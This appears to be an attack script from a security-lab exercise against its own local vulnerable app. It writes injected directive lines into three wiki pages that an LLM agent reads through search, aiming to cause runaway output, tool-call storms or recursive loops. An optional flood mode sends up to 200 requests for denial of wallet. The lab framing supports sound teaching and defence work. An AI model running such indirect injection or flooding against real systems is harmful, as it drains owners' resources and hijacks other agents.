#!/usr/bin/env python3
"""Attack skill — unbounded consumption through three editable wiki pages.

AUTHORIZED SECURITY-LAB USE ONLY. Targets this skill's own vulnerable_app.py.
All cost is simulated token/dollar accounting; nothing is billed.

Overwrites three pages of the target's knowledge base, one per consumption
pattern, each with its real text plus one directive line:

* ``expenses`` <- ``assets/runaway_output.md``  (runaway output)
* ``payroll``  <- ``assets/tool_storm.md``      (tool-call storm)
* ``travel``   <- ``assets/recursive_loop.md``  (recursive agent loop)

The user never sees the pages; the agent reads them through ``search_kb``, and
in vulnerable mode nothing bounds what it does next.

``--flood N`` instead sends N ordinary-looking requests from one client
(denial of wallet): each stays under the per-request budget, so only a
per-client quota stops the total. N is capped at 200.

Exit code: 0 when the pages were written (or the flood ran), 1 when the target
is unreachable.

Examples:
    python scripts/run_consumption.py
    python scripts/run_consumption.py --only tool_storm
    python scripts/run_consumption.py --flood 40 --client attacker
"""

from __future__ import annotations

import argparse
import json
import os
import urllib.error
import urllib.request

SKILL_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
DEFAULT_TARGET = os.getenv("LLM06_TARGET", "http://127.0.0.1:5206")

# payload name -> wiki page it overwrites
PAYLOADS = {
    "runaway_output": "expenses",
    "tool_storm": "payroll",
    "recursive_loop": "travel",
}
MAX_FLOOD = 200


def payload_path(name: str) -> str:
    return os.path.join(SKILL_DIR, "assets", f"{name}.md")


def _post(url: str, body: dict) -> dict:
    req = urllib.request.Request(
        url, data=json.dumps(body).encode("utf-8"),
        headers={"Content-Type": "application/json"}, method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            return json.loads(resp.read())
    except urllib.error.HTTPError as exc:   # 429 quota refusals carry a JSON body
        return json.loads(exc.read())


def check_target(base: str) -> bool:
    try:
        with urllib.request.urlopen(f"{base}/health", timeout=5) as resp:
            ok = json.loads(resp.read()).get("demo") == "llm06"
    except (urllib.error.URLError, OSError, ValueError):
        ok = False
    if not ok:
        print(f"[-] {base} is not the LLM06 target. Start it: python vulnerable_app.py")
    return ok


def flood(base: str, n: int, client: str, query: str) -> None:
    n = max(1, min(n, MAX_FLOOD))
    print(f"[*] Flooding {n} requests as client '{client}': {query!r}")
    served = refused = tokens = 0
    usd = 0.0
    for _ in range(n):
        result = _post(f"{base}/query", {"query": query, "client": client})
        if result["status"] == "quota_exceeded":
            refused += 1
            continue
        served += 1
        tokens += result["cost"]["input_tokens"] + result["cost"]["output_tokens"]
        usd += result["cost_usd"]
    print(f"[+] Served {served}, refused {refused}. Simulated spend: "
          f"{tokens} tokens, ${usd:.4f}.")


def main(argv=None) -> int:
    parser = argparse.ArgumentParser(description=__doc__,
                                     formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--target", default=DEFAULT_TARGET)
    parser.add_argument("--only", choices=sorted(PAYLOADS), help="write one payload only")
    parser.add_argument("--flood", type=int, metavar="N",
                        help=f"send N requests from one client instead (max {MAX_FLOOD})")
    parser.add_argument("--client", default="attacker", help="client id for --flood")
    parser.add_argument("--query", default="When does payroll run each month?",
                        help="question for --flood")
    args = parser.parse_args(argv)

    if not check_target(args.target):
        return 1
    if args.flood:
        flood(args.target, args.flood, args.client, args.query)
        return 0
    names = [args.only] if args.only else list(PAYLOADS)
    for name in names:
        with open(payload_path(name), "r", encoding="utf-8") as fh:
            content = fh.read()
        result = _post(f"{args.target}/kb/page", {"slug": PAYLOADS[name], "content": content})
        print(f"[+] {name}.md written over wiki page '{result['slug']}' "
              f"(unauthenticated POST /kb/page)")
    print(f"[+] {len(names)} page(s) changed, 1 directive line each; no other page touched.")
    print("[*] Re-run scripts/evaluate_kpi.py to measure the effect.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
